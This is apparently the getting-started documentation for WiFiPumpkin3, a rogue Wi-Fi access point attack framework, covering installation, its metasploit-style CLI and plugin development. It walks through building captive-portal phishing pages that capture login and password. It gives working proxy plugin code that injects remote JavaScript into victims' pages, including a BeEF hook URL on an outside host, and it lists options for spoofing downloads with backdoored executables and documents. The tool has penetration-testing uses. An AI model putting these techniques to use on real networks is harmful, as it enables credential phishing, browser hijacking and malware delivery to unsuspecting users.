---
title: Getting Started
tags: 
 - installation
 - github
description: Getting started with WiFiPumpkin3 CLI
---

# Getting Started

## Installation

The **wifipumpkin3** written in `Python 3` , you will need to have a working Python (**version 3.7 or later**) on your machine. 

Note that
- **Windows** is not supported.
- **Mac OS X** is not supported. only **docker** version, but has been not tested.

### Requirements

You will need to have a Wi-Fi adapter that supports **Access-Point (AP) mode**. The following list of OSs represents recommended environments to run `wifipumpkin3` (wp3), as most of required dependencies are pre-installed. VMs or docker are also recommended.

##### Tools (pre-installed)

- iptables (current: iptables v1.6.1)
- iw (current: iw version 4.14)
- net-tools (current: version (1.60+)
- wireless-tools (current: version 30~pre9-12)
- hostapd (current: hostapd v2.6)

##### OS (recommended)

| OS | Version | 
|:-----------|:------------|
Ubuntu  | 18.04 LTS bionic
Docker  | Ubuntu 18.04.4 LTS bionic

### Based on Debian procedure

wifipumpkin3 use the port 53 for mount python dns server, when i try to install on Ubuntu 18.04, i got somes error because this "port 53 is used by another process". This problem is caused by systemd-resolved to solve only follow the step bellow.

1) stop systemd-resolved " sudo systemctl stop systemd-resolved"
   
2) edit /etc/systemd/resolved.conf with these

![dnssettings](https://miro.medium.com/max/1400/1*5qhtKSKUsvAXyWq73V1hiw.png)

3) and execute this link file 
> sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
   
![ln_file](https://miro.medium.com/max/1400/1*1dSK1osF9ktfH7gPFBpR7g.png)

And done !!
font [Nitin Gurbani
](https://medium.com/@niktrix/getting-rid-of-systemd-resolved-consuming-port-53-605f0234f32f)


### Installation procedure

if you've **python 3.7 or later** installed on your machine, it very simple to install the **Wp3**. Follow the steps:

#### Debian/Ubuntu

It is highly recommended install somes system packages, os-level dependencies.
``` sh
sudo apt install python3.7-dev libssl-dev libffi-dev build-essential python3.7
```

```sh
 $ git clone https://github.com/P0cL4bs/wifipumpkin3.git
 $ cd wifipumpkin3
 $ sudo make install
```

or grab a Debian `*.deb` package from GitHub [Releases](https://github.com/P0cL4bs/wifipumpkin3/releases)
``` sh
$ sudo dpkg -i wifipumpkin3-1.0.0-all.deb 
```

##### Installation python virtualenv

Virtualenv is a tool used to create an isolated Python environment. Virtualenv is the easiest and recommended way to configure a custom Python environment. 

{% include alert.html type="warning" title="version of PyQt5"  content="for install change in file requirements.txt the version of Qt5, `PyQt5==5.14.0` to `PyQt5==5.14.2`. This version 5.14.2 work fine on virtualenv without error with python-sip depedencies."%}


``` sh
$ sudo python3.7 -m pip install --upgrade pip
$ git clone https://github.com/P0cL4bs/wifipumpkin3.git
$ cd wifipumpkin3
$ sudo python3.7 -m pip install virtualenv
```
now, you need execute with superuser `root`:
``` 
# virtualenv -p python3.7 venv
# source venv/bin/activate
# make install_env
```

if you see this message bellow, everything ok ! 

> Finished processing dependencies for wifipumpkin3==1.0.0

now, let's execute the app:
``` 
# wifipumpkin3
```
all done, will be see the CLI of `wp3` on virtualenv activated.

When finished working in the virtual environment, you can deactivate it by running the following:

``` 
# deactivate
```

##### Installation on Docker Container
Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. the `wp3` is full compatible to run on docker container. let's go:

> https://docs.docker.com/get-docker/ 

with docker.io installed and working fine, let's take a look how to mount a container with `wp3`. [how to install on ubuntu](https://docs.docker.com/engine/install/ubuntu/) 

``` bash
$ git clone https://github.com/P0cL4bs/wifipumpkin3.git
$ cd wifipumpkin3
$ sudo docker build -t "wifipumpkin3" .
```
this commands above will download and build a new container for us called `wifipumpkin3`, You'll see Docker step through each instruction in your Dockerfile, building up your image as it goes. If successful, the build process should end with a message:

> Successfully tagged wifipumpkin3

Now you need to run your image as a container, start a container based on your new image:

``` bash
$ sudo docker run --privileged -ti --rm --name wifipumpkin3 --net host "wifipumpkin3" 
```

all done, will be see the CLI of `wp3` on docker with mode docker activated. ;)


### About wireless adapters
Your wireless adapter and your kernel driver must support AP mode. In order to check this, execute this shell command:
``` sh
 iw list
```
If there is 'AP' in the list of "Supported interface modes", your card has support for the desired mode.

##### Another method:
* Find your kernel driver module in use by issuing the below command:
``` sh
 lspci -k | grep -A 3 -i network
```
(example module: ath9k)
next, use the below command to find out your wifi capabilities (replace ath9k by your kernel driver):
``` sh
modinfo ath9k | grep depend
```
If the above output includes "mac80211" then it means your wifi card will support the AP mode.

 The adapter needs to have drivers for GNU/Linux.
* another website list devices supported [here](http://elinux.org/RPi_USB_Wi-Fi_Adapters)
* check kernel drive [wireless.wiki](https://wireless.wiki.kernel.org/en/users/drivers)

## Usage

### Interactive Session

Once started the tool with `sudo wifipumpkin3` ,  you'll be presented with an interactive session like the `metasploit framework` where you can enable or disable modules, plugin, proxy configure the ap and etc. 

The interface CLI is very simple, basic commands you'll need to perform operations such as setting a session like accesspoint (AP) information (bssid, channel, interface), start/stop accesspoint and monitor clients activitys joined on AP.

### Pulps

 `Pulps` makes reference to pulp taken from a pumpkin, which can be used for various mixtures. It is possible to script your interactive session using pulps files.  Pulps (script files with a .pulp extension) are a powerful way to automate your attack, like metasploit's `.rc` files, where each line of the file is a command that'll be executed one for one.

let's take a look, how to create a script for set the interface, enable to start without proxy,set ssid the network, set work without log for dns and start the access point.

```python
# configure the interface
set interface wlan1 
# set name of access point will be created
set ssid demo
# set noproxy plguin
set proxy noproxy
# ignore all log from pydns_server 
ignore pydns_server
# start the Access Point
start
```

Once saved as demo.pulp file, you'll be able to load and execute it via:

```bash
sudo wifipumpkin3 --pulp /path/to/demo.pulp
```

if you not want to use .pulp file, exist a options to use the paraments --xpulp or -x and each command can either be executed singularly, or concatenated by the `;` in string. for example:

```bash
sudo wifipumpkin3 --xpulp "set interface wlan1; set ssid demo; set proxy noproxy; start"
```

### Arguments Commands

The basic command line arguments ( wifipumpkin3 -h ) are:

```bash
-i INTERFACE 
```
Network interface to bind to, if empty the default interface is old session started.

```bash
-s SESSION
```
Session for continue attack, if you pass the old session id, all log will be added on same session.

```bash
--pulp PULP
```
Interactive sessions can be scripted with .pulp file,a powerful way to automate your attack.

```bash
--xpulp XPULP
```
each command can either be executed singularly, or concatenated by the ; in string.

```bash
--wireless-mode WIRELESS_MODE
```
Use this options for set the wireless mode (static, docker), by default is `static`  mode, but you can change if you want to run on docker container.

```bash
--no-colors
```
disable terminal colors and effects.

```bash
-v, --version
```
show program's version number and exit.

### Core Commands

>  `help`

Will list all available commands avaliable

> `clients`

show all clients connected on Access Point with advanced UI

> `ap`

show all variable and status for settings AP. You can see (`bssid`, `ssid`, `channel`, `security`,  or `status ap`)

> `set`

set variable proxy,plugin and access point, this command set is like metasploit `set` command.

> `start`

start access point (AP), if not something wrong the will be see a new AP with hostapd program. also the proxy,plugin should be initialized.

> `stop`

stop access point, process, thread, plugin and proxys that is running in background.

> `ignore`

the message logger will be ignored, the parameters can be ( `captiveflask`,  `pumpkinproxy`,  `pydns_server`  `sniffkin3` ). if you type this command not  be see anymore log in console WP.

> `restore`

the message logger will be restored, as you can see above this command is inverse of `ignore` with same parameters will be restore the console log.

> `info`

get info from the proxy/plugin, this command show some informations of proxy/plugin like (log path, config path, description )

> `jobs`

show all threads/processes in background. Sometimes you need to find the process id or thread name of process created by WP.

> `mode`

show all wireless mode available.

> `plugins`

show all plugins available and their status.

> `proxys`

show all proxys available and their status.


> `show`

show available modules.

> `search`

search  modules by name, this will be implemented in the future when milion od modules :sunglasses: is avaliable 


> `use`

select module for modules, full inspiration in metasploit modules.


### Examples


### Plugins

The plugins are designed to add features to WP3 core and run parallel with access point (AP), WP3 provides facilities to develop plugins. Generally speaking, there is really a few things you have to do in order to get a plugin working. 

{% include alert.html type="info" content="The most important is you can run multi plugins simultaneously, because the plugins has been designed to work only monitor and analyse the traffic generate by users connected on access point." %}

The basic command guidelines to get a plugins are:

if you want to enable or disable the plugin, follow command bellow.
```bash
wp3 > set plugin plugin_name true/false
```

if the plugin has subplugins, when type `plugins` you see somes options for set. you can to enable/disable subplugins with command, type `tab` to autocomplete ;): 
```bash
wp3 > set plugin_name.subplugins_name true/false
```

Plugin developers and users are welcome to include your plugin into this project, take a look the guidelines [how to create a plugin](#development).

### Proxys

The Proxys are designed to add features to WP3 core and run parallel with access point (AP),
but redirect all traffic with `iptables`. Proxies work by intercepting a request, modifying the request if necessary, then handling or forwarding the request to its destination. When a user connects to a AP, the transparent proxy intercepts the request before passing it on to the provider.  

{% include alert.html type="info" content="The most important is you can run one proxies each time , because the proxies has been designed to work for manipulate data packets redirecting all data for a specific port number" %}

Avaliable Porxys:

- **pumpkinproxy** - Proxy for intercept network traffic on TCP protocol [doc](#pumpkinproxy)
- **captiveflask** - Allow block Internet access for users until they open the page login page. [doc](#captiveflask)
- **noproxy** - Runnning without proxy redirect traffic

The basic command guidelines to get a plugins are:

if you want to select the proxy, follow command bellow. 
```bash
wp3 > set proxy proxy_name
```

if the proxy has plugins, when type `proxys` you see somes options for set. you can to enable/disable plugin command, type `tab` to autocomplete ;): 
```bash
wp3 > set proxy_name.plugin_name true/false
```

The example above is for enable/disable a plugin, but you can use same sintax to configure plugin paramenter. you can see this paramenter typing `info proxy_name` or using type like this example bellow, using `tab` to autocomplete.

```bash
wp3 > set pumpkinproxy.
pumpkinproxy.beef                            pumpkinproxy.html_inject
pumpkinproxy.beef.url_hook                   pumpkinproxy.html_inject.content_path
pumpkinproxy.downloadspoof                   pumpkinproxy.js_inject
pumpkinproxy.downloadspoof.backdoorExePath   pumpkinproxy.js_inject.url
pumpkinproxy.downloadspoof.backdoorPDFpath   pumpkinproxy.no-cache
pumpkinproxy.downloadspoof.backdoorWORDpath  pumpkinproxy.replaceImages
pumpkinproxy.downloadspoof.backdoorXLSpath   pumpkinproxy.replaceImages.path
wp3 > set pumpkinproxy.
```

let now set `url_hook` parameter the plugin beef to inject javascript in all request http.

```bash
wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js
```

Proxys developers and users are welcome to include your proxy into this project, take a look the guidelines [how to create a proxy](#development).

### Modules

A module provides a features that not is necessary to use with access point, the must modules are projected for add a new functionality into attack, like `devices discovery`, `services enumeration`, `perform deauthentication attacks` and etc.  Modules are introduced to add more functionalities to complement the attack. 

{% include alert.html type="info" content="the syntax of modules basically follow the struct the modules of `metasploit`" %}

The basic core command guidelines:

| commands | descriptions | 
|:-----------|:------------|
set  | set options for module
back  | go back one level
help  | show avaliable commands 
options  | show options of current module
run  | execute module

Modules developers and users are welcome to include your module into this project, take a look the guidelines [how to create a module](#development).

### Development

#### captiveflask
Developing extra captive portals for captiveflask plugins

### description 
the plugin captiveflask allow the Attacker mount a wireless access point which is used in conjuction with a web server and iptables traffic capturing rules to create the phishing portal. Users can freely connect to these networks without a password and will often be directed to a login page where a password is required before being allowed to browse the web.   

### What is Wireless Phishing?
Wireless phishing is any technique by which an attacker attempts to convince wireless network users to divulge sensitive information. As we previously mentioned the associated wireless network is generally open and access to network resources is mediated by a web application known as a captive portal. A captive portal is a web page accessed with a web browser that is displayed to newly connected users of a Wi-Fi network before they are granted broader access to network resources. Captive portals are commonly used to present a landing or log-in page which may require authentication, payment, acceptance of an end-user license agreement or an acceptable use policy, or other valid credentials that both the host and user agree to adhere by. (Wiki)
 

### Creating Captive Portal template
For the interested, we give a brief technical overview of the process of creating a phishing portal here. Example configuration files for creating a simple captive portal template to Wp3.
first of all you need to make a repository fork and add your plugin template. 

Example configuration files for creating a simple template.

``` python
# file => ExamplePlugin.py
from wifipumpkin3.plugins.captivePortal.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class ExamplePlugin(CaptiveTemplatePlugin):
    meta = {
        'Name'      : 'ExamplePlugin',
        'Version'   : '1.0',
        'Description' : 'Example is a simple portal default page',
        'Author'    : ' the Author',
        'TemplatePath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin',
        'StaticPath' : C.TEMPLATES_FLASK + 'templates/ExamplePlugin/static',
        'Preview' : 'plugins/captivePortal/templates/ExamplePlugin/preview.png'
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = Flase 
```

#### File architecture
``` bash
ExamplePlugin/
├── preview.png
├── static
│   ├── css
│   │   ├── bootstrap.min.css
│   │   ├── main.css
│   │   ├── styles.css
│   │   └── util.css
│   └── js
│       ├── bootstrap.min.js
│       ├── jquery-1.11.1.min.js
│       └── main.js
└── templates
    ├── login.html
    └── login_successful.html

4 directories, 9 files
```

### Editing html files 

Set Up the Phishing your custom page login captive portal

**login.html**

``` html
<!DOCTYPE html>
<html >
<head>
<title>Authentification</title>
<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/util.css') }}">
<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/main.css') }}">
</head>
<body >
  <div >
    <!-- Page content -->
    <form method="POST" >
      Login:<br>
      <input type="text" name="login">
      <br>
      Password:<br>
      <input type="text" name="password">
      <br><br>
      <input type="submit" value="Sig up">
    </form>
  </div>
</body>
</html>

```
Set Up the Phishing your custom page login successful

**login_successful.html**

``` html
<!DOCTYPE html>
<html >
<head>
  <title>Authentification</title>
  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/util.css') }}">
  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/main.css') }}">
  </head>
    <h1>Login successful</h1>
  </body>
</html>
```

now, you need to include inside **.config/wifipumpkin3/config/app/captive-portal.ini** the key *ExamplePlugin=false* in tag plugins.
``` ini
[plugins]
FlaskDemo=false
Login_v4=false
loginPage=false
DarkLogin=true
 # new key with my new plugin
ExamplePlugin=false 

```


### Add language into the guest portal

if want to create multiple language that allow the user to pick a different one, checkout!
In plugin ExamplePlugin.py change the bool var **ConfigParser** to True and override function **init_language**. look;

``` python

from wifipumpkin3.plugins.captivePortal.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base


class ExamplePlugin(CaptiveTemplatePlugin):
    meta = {
        'Name'      : 'ExamplePlugin',
        'Version'   : '1.0',
        'Description' : 'Example is a simple portal default page',
        'Author'    : 'The Author',
        'TemplatePath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin',
        'StaticPath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin/static',
        'Preview' : 'plugins/captivePortal/templates/ExamplePlugin/preview.png'
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = True

    def init_language(self, lang):
        if (lang):
          if (lang.lower() != 'default'):
              self.TemplatePath = C.TEMPLATES_FLASK +'templates/ExamplePlugin/language/{}'.format(lang)
              return
          for key,value in self.meta.items():
              self.__dict__[key] = value

```

#### File architecture
``` bash
ExamplePlugin/
├── language
│   ├── En
│   │   └── templates
│   │       ├── login.html
│   │       └── login_successful.html
│   └── ptBr
│       └── templates
│           ├── login.html
│           └── login_successful.html
├── preview.png
├── static
│   ├── css
│   │   ├── bootstrap.min.css
│   │   ├── main.css
│   │   ├── styles.css
│   │   └── util.css
│   └── js
│       ├── bootstrap.min.js
│       ├── jquery-1.11.1.min.js
│       └── main.js
└── templates
    ├── login.html
    └── login_successful.html

9 directories, 13 files
```
now, you need to include inside **settings.ini** the keys.
``` ini
[plugins]
FlaskDemo=false
Login_v4=false
loginPage=false
DarkLogin=true
ExamplePlugin=false

# new section
[set_ExamplePlugin]  
# default language
Default=true
# english language
En=false
 #huer huer br
PtBr=false

```

now only need to edit when you want to send me a pull request, if you do somes test, you want to edit this file bellow.

#### Include the Templates

now, it very simples copy the folder **ExamplePlugin** to path **.config/wifipumpkin3/config/templates/**, the plugin will be listed and working fine for capture the credentails.

#### Enjoy 
have fun!

#### pumpkinproxy

PumpkinProxy is a transparent proxies that you can use to intercept and manipulate HTTP traffic modifying requests and responses, that allow to inject javascripts into the targets visited. 



### Overview 
First of all write the import plugin tamplate 
``` python
from wifipumpkin3.plugins.extension.base import BasePumpkin
```
the basic plugin example:
``` python
from wifipumpkin3.plugins.extension.base import BasePumpkin


class Example(PluginTemplate):
    meta = {
        "_name": "example plugin ",
        "_version": "1.0",
        "_description": "example plugin structure",
        "_author": "by example",
    }

    # get name of plugin static
    @staticmethod
    def getName():
        return Example.meta["_name"]

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = False # no requeire args

    def handleHeader(self, request, key, value):
        pass

    def handleResponse(self, request, data):
        return data
```

### Modify Packets 
Simple fuctions that just adds a header to every request.. 
 ``` python
    def handleResponse(self, request, data):
      data = str(html + "<h1> injected code html </h1>")
      # request.uri url of website 
      print("[{}] [Request]: {} | injected ".format(self._name, request.uri))
      return data
```

example how to remove header from request and set no-cached parameter
 ``` python
    def handleHeader(self, request, key, value):
        if key.decode().lower() == "cache-control":
            value = "no-cache".encode()

        if key.decode().lower() == "if-none-match":
            value = "".encode()
        if key.decode().lower() == "etag":
            value = "".encode()
```

another example how to rewrite packet in real time 
 ``` python
from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup

class js_inject(BasePumpkin):
    meta = {
        "_name": "js_inject",
        "_version": "1.1",
        "_description": "url injection insert and use our own JavaScript code in a page.",
        "_author": "by Maintainer",
    }

    @staticmethod
    def getName():
        return js_inject.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.url = self._config.get("set_js_inject", "url")

    def handleResponse(self, request, data):

        html = BeautifulSoup(data, "lxml")
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url = "{}".format(request.uri)
            metatag = html.new_tag("script")
            metatag.attrs["src"] = self.url
            metatag.attrs["type"] = "text/javascript"
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name, url))
        return data
```

### Logging 
all log will save data(pumpkin-prxoy.log) in your plugin.

### How to add argumments 
Now, if you want to add argumments in proxy.ini for show me on Pumpkin-Proxy->Settings.you need to add in directory "core/config/app/proxy.ini" the key (exampleplugin and set_exampleplugin).

* exampleplugin key is the option checkbox to change and enable or disable plugin
* set_exampleplugin this is key for search all argumments in Settings option.
![plugin_key](http://i.imgur.com/oSvErrZ.png)

### Example from Wp3 with Argummets 
``` python
from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup


class beef(BasePumpkin):
    meta = {
        "_name": "beef",
        "_version": "1.1",
        "_description": "url injection insert and use our own JavaScript code in a page.",
        "_author": "by Maintainer",
    }

    @staticmethod
    def getName():
        return beef.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.urlhook = self.config.get("set_beef", "hook")

    def handleResponse(self, request, data):

        html = BeautifulSoup(data, "lxml")
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url = "{}".format(request.uri)
            metatag = html.new_tag("script")
            metatag.attrs["src"] = self.urlhook
            metatag.attrs["type"] = "text/javascript"
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name, url))
        return data

```

You can easily implement a module to inject data into pages creating a python file in directory "plugins/extension/" and run `make setup` that on next start the prompt, the plugin is there.
